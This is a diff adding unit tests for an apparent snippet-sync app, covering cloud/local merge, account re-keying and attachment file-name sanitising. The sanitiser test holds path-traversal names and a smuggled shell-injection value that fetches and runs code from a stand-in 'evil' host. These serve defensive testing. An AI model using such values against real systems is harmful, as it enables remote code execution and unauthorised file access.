@@ -231,3 +231,44 @@ test('Store.ensurePersonalIds backfills ids so legacy snippets sync instead of v
   assert.strictEqual(merged.push.length, 2);
   assert.strictEqual(store.ensurePersonalIds(), 0); // idempotent
 });
+
+test('mergeSnippetsForSync: same trigger under two ids collapses to the cloud id (newer wins)', () => {
+  const now = Date.parse('2026-10-26T12:00:00Z');
+  const local = [
+    { id: '11111111-1111-4111-8111-111111111111', trigger: ',ch', replacement: 'Checking (pc)', updatedAt: '2026-10-26T10:00:00.000Z' },
+    { id: '22222222-2222-4222-8222-222222222222', trigger: ',gm', replacement: 'Morning (pc, old)', updatedAt: '2026-10-01T10:00:00.000Z' },
+  ];
+  const remote = [
+    { id: 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa', trigger: ',ch', replacement: 'Checking (phone)', enabled: true, updated_at: '2026-10-07T20:00:00.000Z', deleted_at: null },
+    { id: 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb', trigger: ',GM', replacement: 'Good morning team!', enabled: true, updated_at: '2026-10-07T20:00:00.000Z', deleted_at: null },
+  ];
+  const m = mergeSnippetsForSync({ live: local, tombstones: [], remote, now });
+  assert.strictEqual(m.live.length, 2, 'no duplicates');
+  const ch = m.live.find((s) => s.trigger === ',ch');
+  assert.strictEqual(ch.id, 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa');
+  assert.strictEqual(ch.replacement, 'Checking (pc)'); // local was newer
+  assert.strictEqual(m.push.length, 1);
+  assert.strictEqual(m.push[0].id, 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa');
+  const gm = m.live.find((s) => s.trigger.toLowerCase() === ',gm');
+  assert.strictEqual(gm.replacement, 'Good morning team!'); // cloud was newer
+});
+
+test('Store.adoptForAccount re-keys snippets only when a different account signs in', () => {
+  const data = { personalSnippets: [{ id: '11111111-1111-4111-8111-111111111111', trigger: ',a', replacement: 'A' }],
+    snippetTombstones: [{ id: '33333333-3333-4333-8333-333333333333', deletedAt: '2026-10-01T00:00:00.000Z' }] };
+  const store = new Store({ get: (k, d) => (k in data ? data[k] : d), set: (k, v) => { data[k] = v; } });
+  assert.strictEqual(store.adoptForAccount('user-a'), false); // first account: keep as-is
+  assert.strictEqual(store.getPersonal()[0].id, '11111111-1111-4111-8111-111111111111');
+  assert.strictEqual(store.adoptForAccount('user-a'), false);
+  assert.strictEqual(store.adoptForAccount('user-b'), true);
+  assert.notStrictEqual(store.getPersonal()[0].id, '11111111-1111-4111-8111-111111111111');
+  assert.strictEqual(store.getSnippetTombstones().length, 0);
+});
+
+test('safeFileName strips paths and shell characters from shared attachment names', () => {
+  const { safeFileName } = require('../src/store');
+  assert.strictEqual(safeFileName('..\\..\\Startup\\x.bat'), 'x.bat');
+  assert.strictEqual(safeFileName('../../etc/passwd'), 'passwd');
+  assert.ok(!/['";|&$`]/.test(safeFileName("a'; curl evil|sh; echo '.txt")));
+  assert.strictEqual(safeFileName(''), 'attachment');
+});
